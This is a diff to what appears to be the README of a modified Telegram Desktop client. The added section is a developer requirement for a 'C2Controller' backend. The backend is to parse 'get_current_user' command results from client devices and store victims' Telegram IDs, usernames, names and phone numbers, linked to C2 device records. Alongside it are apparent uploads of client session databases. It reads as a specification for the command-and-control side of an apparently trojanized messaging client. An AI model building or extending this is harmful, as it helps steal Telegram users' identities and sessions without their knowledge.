@@ -263,6 +263,28 @@ Web 端开发者请参考以下 SQLite 数据库 (`tdata_client.db`) 结构进�
 * [macOS][mac]
 * [GNU/Linux (使用 Docker)][linux]
 
+## Web端开发注意 (Web Dev Requirement)
+
+### get_current_user 命令对接需求
+
+**需求来源**：TG端开发同事
+
+**需求描述**：
+在 `C2Controller.java` 的 `submitTaskResult` 方法中（约第 528 行之后）增加对 `get_current_user` 命令返回值的解析处理，逻辑如下：
+1.  **判断任务命令**：检查当前处理的任务命令是否为 `get_current_user`。
+2.  **解析返回值**：解析 `result` 字段中的 JSON 字符串。
+    *   客户端返回格式示例：`{"userId":"12345","username":"test","firstName":"Test","lastName":"User","phone":"+861234567890","isPremium":false}`
+3.  **更新数据库**：
+    *   根据 `userId` 更新或插入 `tg_account` 表。
+    *   字段映射：`userId` -> `tgUserId`, `username` -> `username`, `phone` -> `phone`, `firstName` + `lastName` -> `fullName`。
+4.  **关联设备**：将该 Telegram 账号与当前设备 UUID (`c2_device`) 进行关联。
+
+**现状问题**：
+目前后端仅将 `get_current_user` 的结果作为普通字符串存入 `c2_task` 表的 `result` 字段，不会立即更新 `tg_account` 表。目前的 `tg_account` 更新仅依赖于上传完整的 DB 文件时触发，导致命令执行后数据不同步。
+
+**建议代码逻辑位置**：
+`C2Controller.java` -> `submitTaskResult` 方法 -> `if (task != null)` 块内部 -> 在更新任务状态之后。
+
 [//]: # (LINKS)
 [telegram]: https://telegram.org
 [telegram_desktop]: https://desktop.telegram.org
